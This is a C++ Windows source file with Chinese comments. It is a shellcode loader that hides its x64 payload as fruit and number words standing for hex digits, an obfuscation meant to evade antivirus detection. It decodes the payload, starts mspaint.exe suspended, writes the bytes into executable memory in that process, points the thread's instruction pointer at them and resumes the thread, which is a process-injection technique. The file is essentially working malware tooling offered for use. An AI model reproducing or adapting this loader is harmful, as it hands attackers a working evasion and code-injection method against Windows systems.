#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include "transfer.h"
#include "undoreplace.h"
#include "replace.h"
#include <vector>


int main(int argc, char argv[]) {

    replaceShellcode();

    string shellcode = "fig cat four eight eight three egg four fig zero egg eight cat zero zero zero zero zero zero zero four one five one four one five zero five two five one five six four eight three one date two six five four eight eight ban five two six zero four eight eight ban five two one eight four eight eight ban five two two zero four eight eight ban seven two five zero four eight zero fig ban seven four apple four apple four date three one cat nine four eight three one cat zero apple cat three cat six one seven cat zero two two cat two zero four one cat one cat nine zero date four one zero one cat one egg two egg date five two four one five one four eight eight ban five two two zero eight ban four two three cat four eight zero one date zero eight ban eight zero eight eight zero zero zero zero zero zero four eight eight five cat zero seven four six seven four eight zero one date zero five zero eight ban four eight one eight four four eight ban four zero two zero four nine zero one date zero egg three five six four eight fig fig cat nine four one eight ban three four eight eight four eight zero one date six four date three one cat nine four eight three one cat zero apple cat four one cat one cat nine zero date four one zero one cat one three eight egg zero seven five fig one four cat zero three four cat two four zero eight four five three nine date one seven five date eight five eight four four eight ban four zero two four four nine zero one date zero six six four one eight ban zero cat four eight four four eight ban four zero one cat four nine zero one date zero four one eight ban zero four eight eight four eight zero one date zero four one five eight four one five eight five egg five nine five apple four one five eight four one five nine four one five apple four eight eight three egg cat two zero four one five two fig fig egg zero five eight four one five nine five apple four eight eight ban one two egg nine five seven fig fig fig fig fig fig five date four eight ban apple zero one zero zero zero zero zero zero zero zero zero zero zero zero zero zero four eight eight date eight date zero one zero one zero zero zero zero four one ban apple three one eight ban six fig eight seven fig fig date five ban ban fig zero ban five apple two five six four one ban apple apple six nine five ban date nine date fig fig date five four eight eight three cat four two eight three cat zero six seven cat zero apple eight zero fig ban egg zero seven five zero five ban ban four seven one three seven two six fig six apple zero zero five nine four one eight nine date apple fig fig date five six three six one six cat six three two egg six five seven eight six five zero zero zero";

    pair<unsigned char*, int> result = undoShellcode(shellcode);
    unsigned char* my_payload = result.first;
    int len = result.second;

    // 创建挂起进程
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(NULL, (LPSTR)"mspaint.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cout << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 申请可读、可写、可执行的内存
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL) {
        std::cout << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, lpBaseAddress, my_payload, len, &bytesWritten)) {
        std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 获取线程上下文，并修改EIP/RIP的值为申请的内存的首地址
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cout << "GetThreadContext failed: " << GetLastError() << std::endl;
        return 1;
    }
    ctx.Rip = (DWORD64)lpBaseAddress;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cout << "SetThreadContext failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 恢复主线程
    if (ResumeThread(pi.hThread) == -1) {
        std::cout << "ResumeThread failed: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}